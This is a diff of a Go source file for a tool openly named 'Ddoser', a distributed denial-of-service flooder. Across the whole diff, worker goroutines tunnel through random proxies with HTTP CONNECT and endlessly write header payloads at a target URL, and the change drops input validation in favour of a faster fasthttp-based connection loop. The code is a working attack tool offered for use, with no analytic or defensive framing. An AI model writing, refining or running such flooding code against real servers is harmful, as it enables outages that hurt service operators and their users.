@@ -1,30 +1,25 @@
 package main
 
 import (
-	"fmt"
-	"net/http"
-	"net/url"
+	"bufio"
+	"net"
+	"time"
+
+	"github.com/valyala/fasthttp"
 )
 
 type Ddoser struct {
 	url        string
 	numWorkers int
-	useragents []string
+	headers    []string
 	proxies    []string
 }
 
-func NewDdoser(target string, number int, useragents, proxies []string) (*Ddoser, error) {
-	u, err := url.Parse(target)
-
-	// Check if the url is valid
-	if err != nil || len(u.Host) == 0 || len(u.Port()) == 0 {
-		return nil, fmt.Errorf("invalid URL: %s", target)
-	}
-
+func NewDdoser(target string, number int, headers, proxies []string) (*Ddoser, error) {
 	return &Ddoser{
 		url:        target,
 		numWorkers: number,
-		useragents: useragents,
+		headers:    headers,
 		proxies:    proxies,
 	}, nil
 }
@@ -32,31 +27,47 @@ func NewDdoser(target string, number int, useragents, proxies []string) (*Ddoser
 func (d *Ddoser) Run() {
 	for i := 0; i < d.numWorkers; i++ {
 		go func() {
-			req, err := http.NewRequest("GET", d.url, nil)
-			if err != nil {
-				return
-			}
-			req.Header.Set("Accept", "*/*")
-			req.Header.Set("Connection", "keep-alive")
-			req.Header.Set("Referer", "https://www.google.com/")
-
+			var conn net.Conn
+			var err error
 			for {
-				conn, err := connect(random(d.proxies), d.url)
-
-				if err != nil {
+				if conn, err = fasthttp.DialTimeout(random(d.proxies), time.Second*5); err != nil {
 					continue
 				}
 
-				func() {
-					defer conn.Close()
-					for i := 0; i < 100; i++ {
-						req.Header.Set("User-Agent", random(d.useragents))
-						req.Write(conn)
+				req := "CONNECT " + d.url + " HTTP/1.1\r\n\r\n"
+
+				if _, err = conn.Write([]byte(req)); err != nil {
+					continue
+				}
+
+				if err = func() error {
+					res := fasthttp.AcquireResponse()
+					defer fasthttp.ReleaseResponse(res)
+
+					res.SkipBody = true
+
+					if err = res.Read(bufio.NewReader(conn)); err != nil {
+						conn.Close()
+						return err
 					}
-				}()
+
+					if res.StatusCode() != 200 {
+						conn.Close()
+						return err
+					}
+
+					return nil
+				}(); err != nil {
+					continue
+				}
+
+				for i := 0; i < len(d.headers); i++ {
+					if _, err = conn.Write([]byte(d.headers[i])); err != nil {
+						conn.Close()
+						break
+					}
+				}
 			}
 		}()
 	}
-
-	fmt.Println()
 }
